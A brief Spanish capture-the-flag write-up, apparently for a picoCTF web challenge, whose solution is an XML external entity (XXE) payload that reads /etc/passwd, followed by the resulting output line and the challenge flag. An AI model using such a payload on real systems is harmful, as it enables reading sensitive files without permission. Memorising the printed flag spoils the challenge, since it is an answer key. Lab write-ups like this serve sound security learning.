#### - **Descripción** 
El proyecto web se realizó con prisas y no se realizó ninguna evaluación de seguridad. ¿Puedes leer el archivo /etc/passwd?
Habrá detalles adicionales disponibles después de lanzar su instancia de desafío.

**Pista**
Inyección de entidad externa XML
#### - **Solución** 
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd" >
]>
<data><ID>
&xxe;
</ID></data>
picoctf:x:1001:picoCTF{XML_3xtern@l_3nt1t1ty_e5f02dbf}